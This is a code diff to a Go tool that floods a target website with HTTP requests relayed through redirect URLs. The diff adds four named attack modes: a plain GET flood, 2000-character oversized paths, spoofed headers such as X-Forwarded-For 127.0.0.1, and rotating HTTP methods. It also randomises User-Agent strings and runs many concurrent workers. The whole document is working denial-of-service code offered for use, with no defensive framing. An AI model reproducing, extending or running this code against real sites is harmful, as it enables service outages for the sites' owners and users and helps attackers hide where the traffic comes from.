@@ -4,13 +4,29 @@ package swarm
 import (
 	"context"
 	"fmt"
+	"io"
 	"net/http"
 	"net/url"
+	"strings"
 	"sync"
 	"sync/atomic"
 	"time"
 
 	"vivarium/internal/common"
+)
+
+// AttackType defines the type of attack to use through redirects.
+type AttackType int
+
+const (
+	// AttackLocust is a simple HTTP GET flood.
+	AttackLocust AttackType = iota
+	// AttackPollen uses oversized URI paths.
+	AttackPollen
+	// AttackFirefly uses varied unusual headers.
+	AttackFirefly
+	// AttackMolt rotates through different HTTP methods.
+	AttackMolt
 )
 
 // AttackOpts contains options for a swarm attack.
@@ -19,6 +35,7 @@ type AttackOpts struct {
 	Concurrency int           // Number of concurrent goroutines
 	Delay       time.Duration // Delay between requests
 	Verbose     bool          // Enable verbose output
+	AttackType  AttackType    // Type of attack to use
 }
 
 // Result contains the results of a swarm attack.
@@ -125,7 +142,7 @@ func (c *Coordinator) Attack(ctx context.Context, target string, opts AttackOpts
 						return
 					}
 
-					if c.sendRequest(ctx, j.redirectURL) {
+					if c.sendRequest(ctx, j.redirectURL, j.round, opts.AttackType) {
 						successful.Add(1)
 						statsMu.Lock()
 						workerStats[j.workerURL].Successful++
@@ -186,9 +203,51 @@ func (c *Coordinator) Attack(ctx context.Context, target string, opts AttackOpts
 	}, nil
 }
 
-// sendRequest sends a single request through the redirect URL.
-func (c *Coordinator) sendRequest(ctx context.Context, redirectURL string) bool {
-	req, err := http.NewRequestWithContext(ctx, "GET", redirectURL, nil)
+// HTTP methods for Molt attack
+var moltMethods = []string{"GET", "POST", "HEAD", "OPTIONS", "PUT", "DELETE", "PATCH"}
+
+// Firefly header patterns
+var fireflyHeaders = []map[string]string{
+	{
+		"X-Forwarded-For": "127.0.0.1",
+		"X-Client-IP":     "127.0.0.1",
+		"Cache-Control":   "no-cache",
+		"Accept-Encoding": "gzip, deflate, br",
+	},
+	{
+		"Accept":        "*/*",
+		"If-None-Match": "*",
+		"If-Match":      "*",
+	},
+	{
+		"X-Glow-1": strings.Repeat("A", 64),
+		"X-Glow-2": strings.Repeat("B", 64),
+	},
+}
+
+// sendRequest sends a single request through the redirect URL with attack-specific behavior.
+func (c *Coordinator) sendRequest(ctx context.Context, redirectURL string, idx int, attackType AttackType) bool {
+	var method string
+	var reqURL string
+
+	switch attackType {
+	case AttackPollen:
+		// Add oversized path to URL
+		method = "GET"
+		if strings.Contains(redirectURL, "?") {
+			reqURL = redirectURL + "&" + strings.Repeat("A", 2000)
+		} else {
+			reqURL = redirectURL + "/" + strings.Repeat("A", 2000)
+		}
+	case AttackMolt:
+		method = moltMethods[idx%len(moltMethods)]
+		reqURL = redirectURL
+	default:
+		method = "GET"
+		reqURL = redirectURL
+	}
+
+	req, err := http.NewRequestWithContext(ctx, method, reqURL, nil)
 	if err != nil {
 		return false
 	}
@@ -196,13 +255,21 @@ func (c *Coordinator) sendRequest(ctx context.Context, redirectURL string) bool 
 	req.Header.Set("User-Agent", common.RandomUserAgent())
 	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
 
+	// Apply attack-specific headers
+	if attackType == AttackFirefly {
+		headers := fireflyHeaders[idx%len(fireflyHeaders)]
+		for k, v := range headers {
+			req.Header.Set(k, v)
+		}
+	}
+
 	resp, err := c.client.Do(req)
 	if err != nil {
 		return false
 	}
 	defer resp.Body.Close()
+	io.Copy(io.Discard, resp.Body)
 
-	// Any response (even redirect) means the request went through
 	return true
 }
 
